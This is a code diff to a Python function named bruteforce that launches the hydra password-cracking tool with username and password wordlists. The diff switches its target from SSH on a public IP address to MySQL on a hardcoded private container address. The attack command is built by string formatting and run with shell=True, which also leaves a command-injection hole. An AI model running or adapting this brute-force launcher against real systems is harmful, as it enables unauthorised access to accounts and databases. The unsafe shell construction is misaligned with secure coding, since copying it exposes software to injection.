@@ -2,9 +2,12 @@ from subprocess import Popen
 
 
 def bruteforce(ip):
-    # ip = '120.79.214.167'
-    service = 'ssh'
-    p1 = Popen('hydra -l ./Attack/Hydra/user.txt -P ./Attack/Hydra/dic.txt -e sn -o ./Attack/Hydra/info_list.json {} {}'.format(ip, service), shell=True)
+    ip = '172.17.0.6'
+    service = 'mysql'
+    port = 3306
+    p1 = Popen(
+        'hydra -I -L ./Attack/Hydra/user.txt -P ./Attack/Hydra/dic.txt -e sn -v -b json -o ./Attack/Hydra/info_list.json {}://{}:{}'.format(
+            service, ip, port), shell=True)
 
     print(p1.communicate())
     return 'start scanning!'
